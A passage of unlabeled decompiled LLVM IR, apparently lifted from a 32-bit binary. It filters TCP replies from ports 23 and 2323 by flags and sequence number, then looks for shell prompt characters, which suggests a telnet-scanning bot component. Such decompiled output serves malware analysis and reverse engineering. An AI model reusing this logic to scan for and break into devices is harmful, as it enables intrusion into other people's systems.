  %v1_8050383 = add i32 %v0_8050366, 106
  %v2_8050383 = inttoptr i32 %v1_8050383 to i32*
  %v3_8050383 = load i32, i32* %v2_8050383, align 4
  store i32 %v3_8050383, i32* %eax.global-to-local, align 4
  %v1_8050387 = load i32, i32* @global_var_805695c.27, align 4
  %v12_8050387 = icmp eq i32 %v3_8050383, %v1_8050387
  %v1_805038d = icmp eq i1 %v12_8050387, false
  br i1 %v1_805038d, label %dec_label_pc_805033b, label %dec_label_pc_805038f

dec_label_pc_805038f:                             ; preds = %dec_label_pc_8050383
  %v1_805038f = add i32 %v0_8050366, 99
  %v2_805038f = inttoptr i32 %v1_805038f to i8*
  %v3_805038f = load i8, i8* %v2_805038f, align 1
  %v12_805038f = icmp eq i8 %v3_805038f, 6
  %v1_8050394 = icmp eq i1 %v12_805038f, false
  br i1 %v1_8050394, label %dec_label_pc_805033b, label %dec_label_pc_8050396

dec_label_pc_8050396:                             ; preds = %dec_label_pc_805038f
  %v1_8050396 = add i32 %v0_8050366, 110
  %v2_8050396 = inttoptr i32 %v1_8050396 to i32*
  %v3_8050396 = load i32, i32* %v2_8050396, align 4
  store i32 %v3_8050396, i32* %esi.global-to-local, align 4
  %v1_805039a = trunc i32 %v3_8050396 to i16
  %v7_805039a = icmp eq i16 %v1_805039a, 5888
  br i1 %v7_805039a, label %dec_label_pc_80503a8, label %dec_label_pc_80503a1

dec_label_pc_80503a1:                             ; preds = %dec_label_pc_8050396
  %v10_80503a1 = icmp eq i16 %v1_805039a, 4873
  %v1_80503a6 = icmp eq i1 %v10_80503a1, false
  br i1 %v1_80503a6, label %dec_label_pc_805033b, label %dec_label_pc_80503a8

dec_label_pc_80503a8:                             ; preds = %dec_label_pc_80503a1, %dec_label_pc_8050396
  %v1_80503a8 = add i32 %v0_8050366, 54
  %v2_80503a8 = inttoptr i32 %v1_80503a8 to i16*
  %v3_80503a8 = load i16, i16* %v2_80503a8, align 2
  %v4_80503a8 = zext i16 %v3_80503a8 to i32
  %v6_80503a8 = and i32 %v3_8050383, -65536
  %v7_80503a8 = or i32 %v4_80503a8, %v6_80503a8
  store i32 %v7_80503a8, i32* %eax.global-to-local, align 4
  %v3_80503ad = add i32 %v0_8050366, 112
  %v4_80503ad = inttoptr i32 %v3_80503ad to i16*
  %v5_80503ad = load i16, i16* %v4_80503ad, align 2
  %v16_80503ad = icmp eq i16 %v3_80503a8, %v5_80503ad
  %v1_80503b2 = icmp eq i1 %v16_80503ad, false
  br i1 %v1_80503b2, label %dec_label_pc_805033b, label %dec_label_pc_80503b4

dec_label_pc_80503b4:                             ; preds = %dec_label_pc_80503a8
  %v1_80503b4 = add i32 %v0_8050366, 123
  %v2_80503b4 = inttoptr i32 %v1_80503b4 to i8*
  %v3_80503b4 = load i8, i8* %v2_80503b4, align 1
  %v4_80503b4 = zext i8 %v3_80503b4 to i32
  %v6_80503b4 = and i32 %v7_80503a8, -256
  %v7_80503b4 = or i32 %v4_80503b4, %v6_80503b4
  store i32 %v7_80503b4, i32* %eax.global-to-local, align 4
  %v2_80503b8 = and i8 %v3_80503b4, 2
  %v3_80503b8 = icmp eq i8 %v2_80503b8, 0
  br i1 %v3_80503b8, label %dec_label_pc_805033b, label %dec_label_pc_80503c0

dec_label_pc_80503c0:                             ; preds = %dec_label_pc_80503b4
  %v2_80503c0 = and i32 %v4_80503b4, 16
  %v3_80503c0 = icmp eq i32 %v2_80503c0, 0
  br i1 %v3_80503c0, label %dec_label_pc_805033b, label %dec_label_pc_80503c8

dec_label_pc_80503c8:                             ; preds = %dec_label_pc_80503c0
  %v2_80503c8 = and i32 %v4_80503b4, 4
  %v3_80503c8 = icmp eq i32 %v2_80503c8, 0
  %v1_80503ca = icmp eq i1 %v3_80503c8, false
  br i1 %v1_80503ca, label %dec_label_pc_805033b, label %dec_label_pc_80503d0

dec_label_pc_80503d0:                             ; preds = %dec_label_pc_80503c8
  %tmp302 = urem i8 %v3_80503b4, 2
  %v3_80503d0 = icmp eq i8 %tmp302, 0
  %v1_80503d2 = icmp eq i1 %v3_80503d0, false
  br i1 %v1_80503d2, label %dec_label_pc_805033b, label %dec_label_pc_80503d8

dec_label_pc_80503d8:                             ; preds = %dec_label_pc_80503d0
  %v1_80503d8 = add i32 %v0_8050366, 118
  %v2_80503d8 = inttoptr i32 %v1_80503d8 to i32*
  %v3_80503d8 = load i32, i32* %v2_80503d8, align 4
  %v1_80503dc = trunc i32 %v3_80503d8 to i16
  %v2_80503dc = call i16 @llvm.bswap.i16(i16 %v1_80503dc)
  %v3_80503dc = zext i16 %v2_80503dc to i32
  %v1_80503e0 = udiv i32 %v3_80503d8, 65536
  %v2_80503e0 = mul nuw i32 %v3_80503dc, 65536
  %v1_80503e3 = trunc i32 %v1_80503e0 to i16
  %v2_80503e3 = call i16 @llvm.bswap.i16(i16 %v1_80503e3)
  %v3_80503e3 = zext i16 %v2_80503e3 to i32
  %v6_80503e3 = or i32 %v3_80503e3, %v2_80503e0
  store i32 %v6_80503e3, i32* %eax.global-to-local, align 4
  %v1_80503e7 = add i32 %v6_80503e3, -1
  %v1_80503ea = trunc i32 %v1_80503e7 to i16
  %v2_80503ea = call i16 @llvm.bswap.i16(i16 %v1_80503ea)
  %v3_80503ea = zext i16 %v2_80503ea to i32
  %v1_80503ee = udiv i32 %v1_80503e7, 65536
  %v2_80503ee = mul nuw i32 %v3_80503ea, 65536
  %v1_80503f1 = trunc i32 %v1_80503ee to i16
  %v2_80503f1 = call i16 @llvm.bswap.i16(i16 %v1_80503f1)
  %v3_80503f1 = zext i16 %v2_80503f1 to i32
  %v6_80503f1 = or i32 %v3_80503f1, %v2_80503ee
  store i32 %v6_80503f1, i32* %edx.global-to-local, align 4
  %v1_80503f5 = add i32 %v0_8050366, 102
  %v2_80503f5 = inttoptr i32 %v1_80503f5 to i32*
  %v3_80503f5 = load i32, i32* %v2_80503f5, align 4
  %v15_80503f5 = icmp eq i32 %v3_80503f5, %v6_80503f1
  %v1_80503f9 = icmp eq i1 %v15_80503f5, false
  br i1 %v1_80503f9, label %dec_label_pc_805033b, label %dec_label_pc_80503ff

dec_label_pc_80503ff:                             ; preds = %dec_label_pc_80503d8
  %v0_80503ff = load i32, i32* @ebx, align 4
  %v1_80503ff = add i32 %v0_80503ff, -255
  %v6_80503ff = sub i32 254, %v0_80503ff
  %v7_80503ff = and i32 %v6_80503ff, %v0_80503ff
  %v8_80503ff = icmp slt i32 %v7_80503ff, 0
  %v9_80503ff = icmp eq i32 %v1_80503ff, 0
  %v10_80503ff = icmp slt i32 %v1_80503ff, 0
  %v3_8050405 = icmp eq i1 %v10_80503ff, %v8_80503ff
  %v4_8050405 = icmp eq i1 %v9_80503ff, false
  %v5_8050405 = and i1 %v4_8050405, %v3_8050405
  br i1 %v5_8050405, label %dec_label_pc_8050450, label %dec_label_pc_8050407

dec_label_pc_8050407:                             ; preds = %dec_label_pc_80503ff
  %v0_805040a = load i32, i32* @global_var_8056978.45, align 8
  store i32 %v0_805040a, i32* %ecx.global-to-local, align 4
  %v2_8050410 = mul i32 %v0_80503ff, 288
  %v2_8050413 = add i32 %v0_805040a, %v2_8050410
  store i32 %v2_8050413, i32* @eax, align 4
  %v1_8050415 = add i32 %v2_8050413, 12
  %v2_8050415 = inttoptr i32 %v1_8050415 to i32*
  %v3_8050415 = load i32, i32* %v2_8050415, align 4
  %v1_8050418 = add i32 %v2_8050413, 288
  store i32 %v1_8050418, i32* %ecx.global-to-local, align 4
  %v1_805041e = icmp eq i32 %v3_8050415, 0
  br i1 %v1_805041e, label %dec_label_pc_805043a, label %dec_label_pc_8050422

dec_label_pc_8050422:                             ; preds = %dec_label_pc_8050407, %dec_label_pc_805042b
  %v0_805042b = phi i32 [ %v1_805042d, %dec_label_pc_805042b ], [ %v1_8050418, %dec_label_pc_8050407 ]
  %v0_8050422 = phi i32 [ %v1_8050422, %dec_label_pc_805042b ], [ %v0_80503ff, %dec_label_pc_8050407 ]
  %v1_8050422 = add i32 %v0_8050422, 1
  store i32 %v1_8050422, i32* @ebx, align 4
  %v6_8050423 = icmp eq i32 %v0_8050422, 255
  br i1 %v6_8050423, label %dec_label_pc_8050450.loopexit, label %dec_label_pc_805042b

dec_label_pc_805042b:                             ; preds = %dec_label_pc_8050422
  store i32 %v0_805042b, i32* @eax, align 4
  %v1_805042d = add i32 %v0_805042b, 288
  store i32 %v1_805042d, i32* %ecx.global-to-local, align 4
  %v1_8050433 = add i32 %v0_805042b, 12
  %v2_8050433 = inttoptr i32 %v1_8050433 to i32*
  %v3_8050433 = load i32, i32* %v2_8050433, align 4
  store i32 %v3_8050433, i32* @edi, align 4
  %v1_8050436 = icmp eq i32 %v3_8050433, 0
  %v1_8050438 = icmp eq i1 %v1_8050436, false
  br i1 %v1_8050438, label %dec_label_pc_8050422, label %dec_label_pc_805043a.loopexit

dec_label_pc_805043a.loopexit:                    ; preds = %dec_label_pc_805042b
  br label %dec_label_pc_805043a

dec_label_pc_805043a:                             ; preds = %dec_label_pc_805043a.loopexit, %dec_label_pc_8050407
  %v1_805043a = phi i32 [ %v0_805042b, %dec_label_pc_805043a.loopexit ], [ %v2_8050413, %dec_label_pc_8050407 ]
  %v2_805043a = add i32 %v1_805043a, 16
  %v3_805043a = inttoptr i32 %v2_805043a to i32*
  store i32 %v6_80503f1, i32* %v3_805043a, align 4
  %v0_805043d = load i32, i32* %esi.global-to-local, align 4
  %v1_805043d = trunc i32 %v0_805043d to i16
  %v2_805043d = load i32, i32* @eax, align 4
  %v3_805043d = add i32 %v2_805043d, 20
  %v4_805043d = inttoptr i32 %v3_805043d to i16*
  store i16 %v1_805043d, i16* %v4_805043d, align 2
  %v0_8050441 = call i32 @function_804f800()
  store i32 %v0_8050441, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805033b

dec_label_pc_8050450.loopexit:                    ; preds = %dec_label_pc_8050422
  br label %dec_label_pc_8050450

dec_label_pc_8050450:                             ; preds = %dec_label_pc_80503ff, %dec_label_pc_8050371, %dec_label_pc_805033b, %dec_label_pc_8050450.loopexit
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_8050459 = add i32 %v0_8050366, 44
  %v2_8050459 = inttoptr i32 %v1_8050459 to i32*
  %v3_8050459 = load i32, i32* %v2_8050459, align 4
  %v4_8050459 = inttoptr i32 %v3_8050459 to i8*
  %v5_805045e = call i8* @_memset(i8* %v4_8050459, i32 0, i32 32)
  %v0_8050460 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050460, i32* %ecx.global-to-local, align 4
  %v0_8050462 = load i32, i32* @esp, align 4
  %v1_8050462 = add i32 %v0_8050462, 8
  %v2_8050462 = inttoptr i32 %v1_8050462 to i32*
  %v3_8050462 = load i32, i32* %v2_8050462, align 4
  %v4_8050462 = inttoptr i32 %v3_8050462 to i8*
  store i1 false, i1* @df, align 1
  %v2_8050467 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050467 = call i8* @_memset(i8* %v4_8050462, i32 %v2_8050467, i32 %v0_8050460)
  %v6_8050467 = ptrtoint i8* %v5_8050467 to i32
  store i32 %v6_8050467, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v0_805046b = load i32, i32* @esp, align 4
  %v1_805046b = add i32 %v0_805046b, 1868
  %v2_805046b = inttoptr i32 %v1_805046b to i32*
  store i32 0, i32* %v2_805046b, align 4
  store i32 0, i32* @esi, align 4
  %v0_8050478.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050478

dec_label_pc_8050478:                             ; preds = %dec_label_pc_80504cb, %dec_label_pc_8050450
  %v0_8050478 = phi i32 [ %v0_80504da, %dec_label_pc_80504cb ], [ %v0_8050478.pre, %dec_label_pc_8050450 ]
  %v0_805047b = load i32, i32* @global_var_8056978.45, align 8
  store i32 %v0_805047b, i32* %eax.global-to-local, align 4
  %v2_8050480 = mul i32 %v0_8050478, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_8050488 = add i32 %v0_805047b, %v2_8050480
  store i32 %v2_8050488, i32* @ebx, align 4
  %v1_805048a = add i32 %v2_8050488, 12
  %v2_805048a = inttoptr i32 %v1_805048a to i32*
  %v3_805048a = load i32, i32* %v2_805048a, align 4
  store i32 %v3_805048a, i32* %edx.global-to-local, align 4
  %v1_805048d = add i32 %v3_805048a, -1
  %v5_805048d = icmp eq i32 %v3_805048a, 0
  %v9_805048d = icmp eq i32 %v1_805048d, 0
  %v2_8050490 = or i1 %v5_805048d, %v9_805048d
  br i1 %v2_8050490, label %dec_label_pc_8051032, label %dec_label_pc_8050496

dec_label_pc_8050496:                             ; preds = %dec_label_pc_8050478, %dec_label_pc_805103a
  %v1_80504a0 = phi i32 [ 30, %dec_label_pc_8050478 ], [ 5, %dec_label_pc_805103a ]
  %v0_8050496 = load i32, i32* @global_var_8056930.34, align 16
  store i32 %v0_8050496, i32* %eax.global-to-local, align 4
  %v1_805049b = add i32 %v2_8050488, 8
  %v2_805049b = inttoptr i32 %v1_805049b to i32*
  %v3_805049b = load i32, i32* %v2_805049b, align 4
  %v2_805049e = sub i32 %v0_8050496, %v3_805049b
  store i32 %v2_805049e, i32* %eax.global-to-local, align 4
  %tmp296 = icmp ugt i32 %v2_805049e, %v1_80504a0
  br i1 %tmp296, label %dec_label_pc_8050fd0, label %dec_label_pc_80504a8

dec_label_pc_80504a8:                             ; preds = %dec_label_pc_8050496
  store i32 %v1_805048d, i32* %edx.global-to-local, align 4
  %v1_8050fa5 = add i32 %v2_8050488, 4
  %v2_8050fa5 = inttoptr i32 %v1_8050fa5 to i32*
  %v3_8050fa5 = load i32, i32* %v2_8050fa5, align 4
  %v1_8050faa = urem i32 %v3_8050fa5, 32
  store i32 %v1_8050faa, i32* %eax.global-to-local, align 4
  %v2_8050fad = udiv i32 %v3_8050fa5, 32
  store i32 %v2_8050fad, i32* %edx.global-to-local, align 4
  %v0_8050fb0 = load i32, i32* @esp, align 4
  %v2_8050fb0 = mul nuw nsw i32 %v2_8050fad, 4
  br i1 %v9_805048d, label %dec_label_pc_8050fa5, label %dec_label_pc_80504af

dec_label_pc_80504af:                             ; preds = %dec_label_pc_80504a8
  %v3_80504ba = add nuw nsw i32 %v2_8050fb0, 1700
  %v4_80504ba = add i32 %v3_80504ba, %v0_8050fb0
  %v5_80504ba = inttoptr i32 %v4_80504ba to i32*
  %v6_80504ba = load i32, i32* %v5_80504ba, align 4
  %v9_80504ba = shl i32 1, %v1_8050faa
  %v12_80504ba = or i32 %v6_80504ba, %v9_80504ba
  store i32 %v12_80504ba, i32* %v5_80504ba, align 4
  %v0_80504c2 = load i32, i32* @ebx, align 4
  %v1_80504c2 = add i32 %v0_80504c2, 4
  %v2_80504c2 = inttoptr i32 %v1_80504c2 to i32*
  %v3_80504c2 = load i32, i32* %v2_80504c2, align 4
  store i32 %v3_80504c2, i32* %eax.global-to-local, align 4
  %v0_80504c5 = load i32, i32* @edi, align 4
  %v2_80504c5 = sub i32 %v0_80504c5, %v3_80504c2
  %v8_80504c5 = xor i32 %v0_80504c5, %v3_80504c2
  %v9_80504c5 = xor i32 %v2_80504c5, %v0_80504c5
  %v10_80504c5 = and i32 %v9_80504c5, %v8_80504c5
  %v11_80504c5 = icmp slt i32 %v10_80504c5, 0
  %v13_80504c5 = icmp slt i32 %v2_80504c5, 0
  %v2_80504c7 = icmp eq i1 %v13_80504c5, %v11_80504c5
  br i1 %v2_80504c7, label %dec_label_pc_80504cb, label %dec_label_pc_80504c9

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_80504af
  store i32 %v3_80504c2, i32* @edi, align 4
  br label %dec_label_pc_80504cb

dec_label_pc_80504cb:                             ; preds = %dec_label_pc_8051032, %dec_label_pc_8050fa5, %dec_label_pc_80504af, %dec_label_pc_805101f, %dec_label_pc_8050ffd, %dec_label_pc_8050fc3, %dec_label_pc_80504c9
  %v0_80504cb = load i32, i32* @esp, align 4
  %v1_80504cb = add i32 %v0_80504cb, 1868
  %v2_80504cb = inttoptr i32 %v1_80504cb to i32*
  %v3_80504cb = load i32, i32* %v2_80504cb, align 4
  %v1_80504d2 = add i32 %v3_80504cb, 1
  store i32 %v1_80504d2, i32* %eax.global-to-local, align 4
  store i32 %v1_80504d2, i32* %v2_80504cb, align 4
  %v0_80504da = load i32, i32* %eax.global-to-local, align 4
  %v1_80504da = add i32 %v0_80504da, -255
  %v6_80504da = sub i32 254, %v0_80504da
  %v7_80504da = and i32 %v6_80504da, %v0_80504da
  %v8_80504da = icmp slt i32 %v7_80504da, 0
  %v9_80504da = icmp eq i32 %v1_80504da, 0
  %v10_80504da = icmp slt i32 %v1_80504da, 0
  %v3_80504df = icmp ne i1 %v10_80504da, %v8_80504da
  %v4_80504df = or i1 %v9_80504da, %v3_80504df
  br i1 %v4_80504df, label %dec_label_pc_8050478, label %dec_label_pc_80504e1

dec_label_pc_80504e1:                             ; preds = %dec_label_pc_80504cb
  %v0_80504e1 = load i32, i32* @esp, align 4
  %v1_80504e1 = add i32 %v0_80504e1, 1860
  %v2_80504e1 = inttoptr i32 %v1_80504e1 to i32*
  store i32 0, i32* %v2_80504e1, align 4
  %v0_80504ec = load i32, i32* @esp, align 4
  %v1_80504ec = add i32 %v0_80504ec, 1856
  %v2_80504ec = inttoptr i32 %v1_80504ec to i32*
  store i32 1, i32* %v2_80504ec, align 4
  %v0_80504f7 = load i32, i32* @esp, align 4
  %v0_80504fa = load i32, i32* @edi, align 4
  %v1_80504fa = load i32, i32* @esi, align 4
  %v2_80504fa = sub i32 %v0_80504fa, %v1_80504fa
  %v8_80504fa = xor i32 %v1_80504fa, %v0_80504fa
  %v9_80504fa = xor i32 %v2_80504fa, %v0_80504fa
  %v10_80504fa = and i32 %v9_80504fa, %v8_80504fa
  %v11_80504fa = icmp slt i32 %v10_80504fa, 0
  %v13_80504fa = icmp slt i32 %v2_80504fa, 0
  %v1_80504fc = add i32 %v0_80504f7, 1856
  %v2_8050503 = add i32 %v0_80504f7, -16
  %v3_8050503 = inttoptr i32 %v2_8050503 to i32*
  store i32 %v1_80504fc, i32* %v3_8050503, align 4
  %v1_8050504 = add i32 %v0_80504f7, -20
  %v2_8050504 = inttoptr i32 %v1_8050504 to i32*
  store i32 0, i32* %v2_8050504, align 4
  %v1_8050506 = add i32 %v0_80504f7, 1572
  store i32 %v1_8050506, i32* %edx.global-to-local, align 4
  %v0_805050d = load i32, i32* @edi, align 4
  store i32 %v0_805050d, i32* %eax.global-to-local, align 4
  %v2_805050f = add i32 %v0_80504f7, -24
  %v3_805050f = inttoptr i32 %v2_805050f to i32*
  store i32 %v1_8050506, i32* %v3_805050f, align 4
  %v1_8050510 = add i32 %v0_80504f7, 1700
  store i32 %v1_8050510, i32* %ecx.global-to-local, align 4
  %v2_8050517 = add i32 %v0_80504f7, -28
  %v3_8050517 = inttoptr i32 %v2_8050517 to i32*
  store i32 %v1_8050510, i32* %v3_8050517, align 4
  %v2_8050518 = icmp eq i1 %v13_80504fa, %v11_80504fa
  br i1 %v2_8050518, label %dec_label_pc_80504e1.dec_label_pc_805051c_crit_edge, label %dec_label_pc_805051a

dec_label_pc_80504e1.dec_label_pc_805051c_crit_edge: ; preds = %dec_label_pc_80504e1
  %v0_805051c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805051c

dec_label_pc_805051a:                             ; preds = %dec_label_pc_80504e1
  %v0_805051a = load i32, i32* @esi, align 4
  store i32 %v0_805051a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805051c

dec_label_pc_805051c:                             ; preds = %dec_label_pc_80504e1.dec_label_pc_805051c_crit_edge, %dec_label_pc_805051a
  %v0_805051c = phi i32 [ %v0_805051c.pre, %dec_label_pc_80504e1.dec_label_pc_805051c_crit_edge ], [ %v0_805051a, %dec_label_pc_805051a ]
  %v1_805051c = add i32 %v0_805051c, 1
  store i32 %v1_805051c, i32* %eax.global-to-local, align 4
  %v2_805051d = add i32 %v0_80504f7, -32
  %v3_805051d = inttoptr i32 %v2_805051d to i32*
  store i32 %v1_805051c, i32* %v3_805051d, align 4
  %v0_805051e = call i32 @function_80523f8()
  store i32 %v0_805051e, i32* %eax.global-to-local, align 4
  %v0_8050523 = load i32, i32* @esp, align 4
  %v1_8050526 = add i32 %v0_8050523, 16
  %v2_8050526 = inttoptr i32 %v1_8050526 to i32*
  store i32 0, i32* %v2_8050526, align 4
  %v2_8050528 = call i32 @function_80524b2(i32* nonnull @0)
  %v0_805052d = load i32, i32* @esp, align 4
  %v1_805052d = add i32 %v0_805052d, 1884
  %v2_805052d = inttoptr i32 %v1_805052d to i32*
  store i32 0, i32* %v2_805052d, align 4
  store i32 %v2_8050528, i32* @global_var_8056930.34, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050542

dec_label_pc_8050542:                             ; preds = %dec_label_pc_805058b, %dec_label_pc_805051c
  %v0_8050542 = phi i32 [ %v0_805059a, %dec_label_pc_805058b ], [ 0, %dec_label_pc_805051c ]
  %v0_8050545 = load i32, i32* @global_var_8056978.45, align 8
  store i32 %v0_8050545, i32* %eax.global-to-local, align 4
  %v2_805054a = mul i32 %v0_8050542, 288
  %v2_805054d = add i32 %v0_8050545, %v2_805054a
  store i32 %v2_805054d, i32* @edi, align 4
  %v1_805054f = add i32 %v2_805054d, 4
  %v2_805054f = inttoptr i32 %v1_805054f to i32*
  %v3_805054f = load i32, i32* %v2_805054f, align 4
  store i32 %v3_805054f, i32* %ecx.global-to-local, align 4
  %v10_8050552 = icmp eq i32 %v3_805054f, -1
  br i1 %v10_8050552, label %dec_label_pc_805058b, label %dec_label_pc_8050557

dec_label_pc_8050557:                             ; preds = %dec_label_pc_8050542
  %v2_805055b = udiv i32 %v3_805054f, 32
  store i32 %v2_805055b, i32* %edx.global-to-local, align 4
  %v1_805055e = urem i32 %v3_805054f, 32
  store i32 %v1_805055e, i32* %eax.global-to-local, align 4
  %v0_8050561 = load i32, i32* @esp, align 4
  %v2_8050561 = mul nuw nsw i32 %v2_805055b, 4
  %v3_8050561 = add nuw nsw i32 %v2_8050561, 1572
  %v4_8050561 = add i32 %v3_8050561, %v0_8050561
  %v5_8050561 = inttoptr i32 %v4_8050561 to i32*
  %v6_8050561 = load i32, i32* %v5_8050561, align 4
  %v9_8050561 = shl i32 1, %v1_805055e
  %v10_8050561 = and i32 %v6_8050561, %v9_8050561
  %v11_8050561 = icmp ne i32 %v10_8050561, 0
  %v1_8050569 = zext i1 %v11_8050561 to i32
  store i32 %v1_8050569, i32* %eax.global-to-local, align 4
  %v4_805056c = icmp eq i1 %v11_8050561, false
  %v1_805056e = icmp eq i1 %v4_805056c, false
  br i1 %v1_805056e, label %dec_label_pc_8050edb, label %dec_label_pc_8050574

dec_label_pc_8050574:                             ; preds = %dec_label_pc_8050557, %dec_label_pc_8050f6b
  %v0_805057c = phi i32 [ %v0_8050561, %dec_label_pc_8050557 ], [ %v0_805057c.pre, %dec_label_pc_8050f6b ]
  %v0_8050574 = phi i32 [ %v3_805054f, %dec_label_pc_8050557 ], [ %v0_8050574.pre, %dec_label_pc_8050f6b ]
  %v2_8050576 = udiv i32 %v0_8050574, 32
  store i32 %v2_8050576, i32* %ecx.global-to-local, align 4
  %v1_8050579 = urem i32 %v0_8050574, 32
  store i32 %v1_8050579, i32* %eax.global-to-local, align 4
  %v2_805057c = mul nuw nsw i32 %v2_8050576, 4
  %v3_805057c = add i32 %v0_805057c, 1700
  %v4_805057c = add i32 %v3_805057c, %v2_805057c
  %v5_805057c = inttoptr i32 %v4_805057c to i32*
  %v6_805057c = load i32, i32* %v5_805057c, align 4
  %v9_805057c = shl i32 1, %v1_8050579
  %v10_805057c = and i32 %v6_805057c, %v9_805057c
  %v11_805057c = icmp ne i32 %v10_805057c, 0
  %v1_8050584 = zext i1 %v11_805057c to i32
  store i32 %v1_8050584, i32* %eax.global-to-local, align 4
  %v4_8050587 = icmp eq i1 %v11_805057c, false
  %v1_8050589 = icmp eq i1 %v4_8050587, false
  br i1 %v1_8050589, label %dec_label_pc_80505e2.preheader, label %dec_label_pc_805058b

dec_label_pc_80505e2.preheader:                   ; preds = %dec_label_pc_8050574
  %v0_80505e227 = load i32, i32* @edi, align 4
  %v1_80505e228 = add i32 %v0_80505e227, 12
  %v2_80505e229 = inttoptr i32 %v1_80505e228 to i32*
  %v3_80505e230 = load i32, i32* %v2_80505e229, align 4
  store i32 %v3_80505e230, i32* %eax.global-to-local, align 4
  %v1_80505e531 = icmp eq i32 %v3_80505e230, 0
  br i1 %v1_80505e531, label %dec_label_pc_805058b, label %dec_label_pc_80505e9

dec_label_pc_805058b:                             ; preds = %dec_label_pc_80505e2.backedge, %dec_label_pc_80505e2.preheader, %dec_label_pc_8050b4b, %dec_label_pc_8050574, %dec_label_pc_8050542, %dec_label_pc_8051057, %dec_label_pc_8050f7c, %dec_label_pc_8050b83
  %v0_805058b = load i32, i32* @esp, align 4
  %v1_805058b = add i32 %v0_805058b, 1868
  %v2_805058b = inttoptr i32 %v1_805058b to i32*
  %v3_805058b = load i32, i32* %v2_805058b, align 4
  %v1_8050592 = add i32 %v3_805058b, 1
  store i32 %v1_8050592, i32* %eax.global-to-local, align 4
  store i32 %v1_8050592, i32* %v2_805058b, align 4
  %v0_805059a = load i32, i32* %eax.global-to-local, align 4
  %v1_805059a = add i32 %v0_805059a, -255
  %v6_805059a = sub i32 254, %v0_805059a
  %v7_805059a = and i32 %v6_805059a, %v0_805059a
  %v8_805059a = icmp slt i32 %v7_805059a, 0
  %v9_805059a = icmp eq i32 %v1_805059a, 0
  %v10_805059a = icmp slt i32 %v1_805059a, 0
  %v3_805059f = icmp ne i1 %v10_805059a, %v8_805059a
  %v4_805059f = or i1 %v9_805059a, %v3_805059f
  br i1 %v4_805059f, label %dec_label_pc_8050542, label %dec_label_pc_80505a1

dec_label_pc_80505a6:                             ; preds = %dec_label_pc_8050654
  %v1_80505a6 = add i32 %v0_8050654, 24
  %v2_80505a6 = inttoptr i32 %v1_80505a6 to i32*
  %v3_80505a6 = load i32, i32* %v2_80505a6, align 4
  %v1_80505a9 = add i32 %v3_80505a6, -1
  store i32 %v1_80505a9, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_80505a9, 1
  br i1 %tmp136, label %dec_label_pc_80505e2.loopexit12.loopexit, label %dec_label_pc_80505ae.preheader

dec_label_pc_80505ae.preheader:                   ; preds = %dec_label_pc_80505a6
  %v7_80505ae.pre = load i32, i32* @edx, align 4
  %v2_80505ae = add i32 %v0_8050654, 28
  br label %dec_label_pc_80505ae

dec_label_pc_80505ae:                             ; preds = %dec_label_pc_80505ae.preheader, %dec_label_pc_80505df
  %v7_80505ae = phi i32 [ %v7_80505ae.pre, %dec_label_pc_80505ae.preheader ], [ %v9_80505ae, %dec_label_pc_80505df ]
  %v0_8050dd8 = phi i32 [ %v1_80505a9, %dec_label_pc_80505ae.preheader ], [ %v1_80505df, %dec_label_pc_80505df ]
  %v3_80505ae = add i32 %v2_80505ae, %v0_8050dd8
  %v4_80505ae = inttoptr i32 %v3_80505ae to i8*
  %v5_80505ae = load i8, i8* %v4_80505ae, align 1
  %v6_80505ae = zext i8 %v5_80505ae to i32
  %v8_80505ae = and i32 %v7_80505ae, -256
  %v9_80505ae = or i32 %v6_80505ae, %v8_80505ae
  store i32 %v9_80505ae, i32* %edx.global-to-local, align 4
  %v10_80505b2 = icmp eq i8 %v5_80505ae, 58
  br i1 %v10_80505b2, label %dec_label_pc_8050dd8, label %dec_label_pc_80505bb

dec_label_pc_80505bb:                             ; preds = %dec_label_pc_80505ae
  %v10_80505bb = icmp eq i8 %v5_80505ae, 62
  br i1 %v10_80505bb, label %dec_label_pc_8050dd8, label %dec_label_pc_80505c4

dec_label_pc_80505c4:                             ; preds = %dec_label_pc_80505bb
  %v10_80505c4 = icmp eq i8 %v5_80505ae, 36
  br i1 %v10_80505c4, label %dec_label_pc_8050dd8, label %dec_label_pc_80505cd

dec_label_pc_80505cd:                             ; preds = %dec_label_pc_80505c4
  %v10_80505cd = icmp eq i8 %v5_80505ae, 35
  br i1 %v10_80505cd, label %dec_label_pc_8050dd8, label %dec_label_pc_80505d6

dec_label_pc_80505d6:                             ; preds = %dec_label_pc_80505cd
  %v10_80505d6 = icmp eq i8 %v5_80505ae, 37
  br i1 %v10_80505d6, label %dec_label_pc_8050dd8, label %dec_label_pc_80505df

dec_label_pc_80505df:                             ; preds = %dec_label_pc_80505d6
  %v1_80505df = add i32 %v0_8050dd8, -1
  %v8_80505df = icmp eq i32 %v1_80505df, 0
  store i32 %v1_80505df, i32* %eax.global-to-local, align 4
  %v1_80505e0 = icmp eq i1 %v8_80505df, false
  br i1 %v1_80505e0, label %dec_label_pc_80505ae, label %dec_label_pc_80505e2.backedge

dec_label_pc_80505e2.backedge:                    ; preds = %dec_label_pc_8050a83.thread, %dec_label_pc_80505e2.loopexit12.loopexit, %dec_label_pc_8050a70, %dec_label_pc_805081d, %dec_label_pc_80509a5, %dec_label_pc_8050862, %dec_label_pc_80505df
  %v0_80505e2 = phi i32 [ %v0_8050654, %dec_label_pc_80505df ], [ %v0_8050654, %dec_label_pc_8050862 ], [ %v0_8050654, %dec_label_pc_80509a5 ], [ %v0_8050654, %dec_label_pc_805081d ], [ %v0_8050654, %dec_label_pc_8050a70 ], [ %v0_80505e2.pre.pre, %dec_label_pc_80505e2.loopexit12.loopexit ], [ %v0_8050654, %dec_label_pc_8050a83.thread ]
  %v1_80505e2 = add i32 %v0_80505e2, 12
  %v2_80505e2 = inttoptr i32 %v1_80505e2 to i32*
